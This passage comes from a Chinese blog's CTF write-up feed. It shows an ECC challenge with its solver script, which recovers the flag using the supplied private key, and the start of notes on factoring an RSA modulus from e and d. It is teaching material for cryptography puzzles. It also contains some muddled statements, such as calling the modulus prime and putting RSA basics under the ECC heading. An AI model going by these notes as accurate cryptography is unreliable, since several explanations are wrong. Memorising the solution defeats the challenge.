punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="ecc"><a class="anchor" href="#ecc">#</a> ECC</h2>
<p>在网安数学的教材上看到过椭圆曲线加密，海量的公式＋复杂的绘图。嗯，这一定很 BT</p>
<p>这道题的源码如下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>a <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>b <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>m <span class="token operator">=</span> E<span class="token punctuation">.</span>random_point<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>G <span class="token operator">=</span> E<span class="token punctuation">.</span>random_point<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>k <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>K <span class="token operator">=</span> k <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="13"></td><td><pre>r <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>c1 <span class="token operator">=</span> m <span class="token operator">+</span> r <span class="token operator">*</span> K</pre></td></tr><tr><td data-num="15"></td><td><pre>c2 <span class="token operator">=</span> r <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="16"></td><td><pre>cipher_left <span class="token operator">=</span> s2n<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="17"></td><td><pre>cipher_right <span class="token operator">=</span> s2n<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"a = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"b = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"k = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>k<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"E = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>E<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"cipher_left = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher_left<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"cipher_right = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher_right<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">#p = 74997021559434065975272431626618720725838473091721936616560359000648651891507</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">#a = 61739043730332859978236469007948666997510544212362386629062032094925353519657</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment">#b = 87821782818477817609882526316479721490919815013668096771992360002467657827319</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment">#k = 93653874272176107584459982058527081604083871182797816204772644509623271061231</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token comment">#E = Elliptic Curve defined by y^2 = x^3 + 61739043730332859978236469007948666997510544212362386629062032094925353519657*x + 12824761259043751634610094689861000765081341921946160155432001001819005935812 over Finite Field of size 74997021559434065975272431626618720725838473091721936616560359000648651891507</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">#c1 = (14455613666211899576018835165132438102011988264607146511938249744871964946084 : 25506582570581289714612640493258299813803157561796247330693768146763035791942 : 1)</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">#c2 = (37554871162619456709183509122673929636457622251880199235054734523782483869931 : 71392055540616736539267960989304287083629288530398474590782366384873814477806 : 1)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">#cipher_left = 68208062402162616009217039034331142786282678107650228761709584478779998734710</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token comment">#cipher_right = 27453988545002384546706933590432585006240439443312571008791835203660152890619</span></pre></td></tr></table></figure><p>真真看不懂，去百度也都是比这道题更难理解的，实在是难以入门；</p>
<p>搜罗到一些 ECC 的原理，可以看一下。</p>
<p>找出两个 “很大” 的质数：P &amp; Q<br />
N = P * Q<br />
M = (P – 1) * (Q – 1)</p>
<p>找出整数 E，E 与 M 互质，即除了 1 之外，没有其他公约数</p>
<p>找出整数 D，使得 ED 除以 M 余 1，即 (E D) % M = 1，等价于 E<em>D-1=K</em>M</p>
<p>经过上述准备工作之后，可以得到：</p>
<pre><code>E是公钥，负责加密
D是私钥，负责解密
N负责公钥和私钥之间的联系
</code></pre>
<p>加密算法，假定对 X 进行加密</p>
<pre><code>(X ^ E) % N = Y
</code></pre>
<p>解密算法，根据费尔马小定义，可以使用以下公式完成解密</p>
<pre><code>(Y ^ D) % N = X
</code></pre>
<p>简单而言，椭圆曲线是基于解决离散问题的算法；给定 K 和 G, 算出 k。（点 G 称为基点，K=kG [其中 K,G 为 Ep (a,b) 上的点，k 为小于 n（n 是点 G 的阶）的整数]）<br />
1、用户 A 选定一条椭圆曲线 Ep (a,b)，并取椭圆曲线上一点，作为基点 G。<br />
2、用户 A 选择一个私有密钥 k，并生成公开密钥 K=kG。<br />
3、用户 A 将 Ep (a,b) 和点 K，G 传给用户 B。<br />
4、用户 B 接到信息后 ，将待传输的明文编码到 Ep (a,b) 上一点 M（编码方法很多，这里不作讨论），并产生一个随机整数 r。<br />
5、用户 B 计算点 C1=M+rK；C2=rG。<br />
6、用户 B 将 C1、C2 传给用户 A。<br />
7、用户 A 接到信息后，计算 C1-kC2，结果就是点 M。因为 C1-kC2=M+rK-k (rG)=M+rK-r (kG)=M<br />
 再对点 M 进行解码就可以得到明文。</p>
<p>在这个加密通信中，如果有一个偷窥者 H ，他只能看到 Ep (a,b)、K、G、C1、C2，而通过 K、G 求 k 或通过 C2、G 求 r 都是相对困难的，因此，H 无法得到 A、B 间传送的明文信息。</p>
<p>有的人也会用到 sagemath 下面是使用手册<span class="exturl" data-url="aHR0cHM6Ly93d3cuZG9jaW4uY29tL3AtMTc5MjgwNDkwOS5odG1s"></span></p>
<p>等待 wp 后</p>
<p>payload:</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>p <span class="token operator">=</span> <span class="token number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></pre></td></tr><tr><td data-num="4"></td><td><pre>a <span class="token operator">=</span> <span class="token number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></pre></td></tr><tr><td data-num="5"></td><td><pre>b <span class="token operator">=</span> <span class="token number">87821782818477817609882526316479721490919815013668096771992360002467657827319</span></pre></td></tr><tr><td data-num="6"></td><td><pre>k <span class="token operator">=</span> <span class="token number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></pre></td></tr><tr><td data-num="7"></td><td><pre>E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>c1 <span class="token operator">=</span> E<span class="token punctuation">(</span><span class="token number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span><span class="token punctuation">,</span> <span class="token number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>c2 <span class="token operator">=</span> E<span class="token punctuation">(</span><span class="token number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>m<span class="token operator">=</span>c1<span class="token operator">-</span>k<span class="token operator">*</span>c2</pre></td></tr><tr><td data-num="12"></td><td><pre>cipher_left <span class="token operator">=</span> <span class="token number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></pre></td></tr><tr><td data-num="13"></td><td><pre>cipher_right <span class="token operator">=</span> <span class="token number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>cipher_left<span class="token operator">//</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>cipher_right<span class="token operator">//</span>m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf-wp</tag>
      </tags>
  </entry>
  <entry>
    <title>十万个 Crypto【Updating...】</title>
    <url>/crypto/write/RSA%E5%92%8C%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E5%AF%86%E7%A0%81%E7%9F%A5%E8%AF%86%E7%9A%84%E5%BD%92%E7%BA%B3I/</url>
    <content><![CDATA[<p>顾及到做密码时候会遇到很多奇奇怪怪的编码，甚至就会因为这几个让人摸不着脑的疑惑卡住整个进程；所以我想在讲述 RSA、ECC 这些算法之前先把我最近遇到过的概念总结一下。<br />
<a id="more"></a></p>
<h1 id="rsa"><a class="anchor" href="#rsa">#</a> RSA</h1>
<h2 id="factoring-large-integers"><a class="anchor" href="#factoring-large-integers">#</a> Factoring Large Integers</h2>
<p>给定模数 n，共有指数 e 和私有指数 d，如何利用 ed 获取 p 和 q 呢？</p>
<p>通常都是小网站安排上直接分解 p、q，快捷便利不香么？</p>
<p>但是这次在这里这招不行</p>
<p>不信？试试分解一下下面这个</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>n <span class="token operator">=</span> <span class="token number">16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309</span></pre></td></tr><tr><td data-num="2"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="3"></td><td><pre>d <span class="token operator">=</span> <span class="token number">9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453</span></pre></td></tr></table></figure><p>结果如何。</p>
<p><img data-src="https://s1.ax1x.com/2022/04/14/L1Xfvd.png" alt="" /></p>
<p>长度 617，还是质数的模数，怎么破都破不开，那是不是就分不出 p 和 q 了呢？</p>
<p>Don't 担心。其实这个问题早在 90 年代就被 boneh 先生给思考透了</p>
<p><a href="https://imgtu.com/i/L1vw01"><img data-src="https://s1.ax1x.com/2022/04/14/L1vw01.png" alt="L1vw01.png" /></a></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mi>e</mi><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>对于（</mtext><mn>2</mn><mtext>，</mtext><mi>n</mi><mtext>）中的任何随机数，存在一个数</mtext><mi>x</mi><mtext>使得</mtext><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mtext>存在，最后通过</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>（</mtext><mi>x</mi><mo>−</mo><mn>1</mn><mtext>，</mtext><mi>n</mi><mtext>）求出</mtext><mi>p</mi><mspace linebreak="newline"></mspace><mi>R</mi><mi>S</mi><mi>A</mi><mtext>中恒不变的</mtext><mi>d</mi><mi>e</mi><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>及</mtext><mi>d</mi><mi>e</mi><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">de \equiv 1mod \phi(n) \\ 对于（2，n）中的任何随机数，存在一个数x使得1modn存在，最后通过gcd（x-1，n）求出p\\RSA中恒不变的de\equiv1mod(p-1)及de\equiv1mod(q-1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">（</span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">何</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">x</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">（</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">求</span><span class="mord cjk_fallback">出</span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">恒</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">及</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>定义</mtext><mi>k</mi><mtext>为</mtext><mi>p</mi><mo>−</mo><mn>1</mn><mtext>和</mtext><mi>q</mi><mo>−</mo><mn>1</mn><mtext>的最小公倍数</mtext><mi>l</mi><mi>c</mi><mi>m</mi><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace width="1em"/><mtext>由此可得</mtext><mi>d</mi><mi>e</mi><mo>≡</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>k</mi><mspace width="1em"/><mtext>这是</mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>的严格除数</mtext></mrow><annotation encoding="application/x-tex">定义k为p-1和q-1的最小公倍数lcm(p-1,q-1) \quad 由此可得de\equiv1modk \quad 这是\phi(n)的严格除数
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">倍</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">严</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">数</span></span></span></span></span></p>
<p>有些隐约其辞是不啦，简单点来讲就是</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先我们需要计算一个未知数</mtext><mi>k</mi><mo>=</mo><mi>d</mi><mi>e</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>选取一个随机变量</mtext><mi>g</mi><mo stretchy="false">(</mo><mn>1</mn><mo>&lt;</mo><mi>g</mi><mo>&lt;</mo><mi>n</mi><mo stretchy="false">)</mo><mtext>；</mtext><mspace linebreak="newline"></mspace><mtext>再设一个数</mtext><mi>k</mi><mo>=</mo><msup><mn>2</mn><mi>t</mi></msup><mi>r</mi><mspace width="1em"/><mi>r</mi><mo>∈</mo><mi>o</mi><mi>d</mi><mi>d</mi><mspace width="1em"/><mi>a</mi><mi>n</mi><mi>d</mi><mspace width="1em"/><mi>t</mi><mo>≥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">首先我们需要计算一个未知数k=de-1,选取一个随机变量g (1 &lt; g &lt; n)；\\再设一个数k=2^tr \quad r \in odd \quad and \quad t \geq1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">未</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">；</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.882656em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.843556em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" 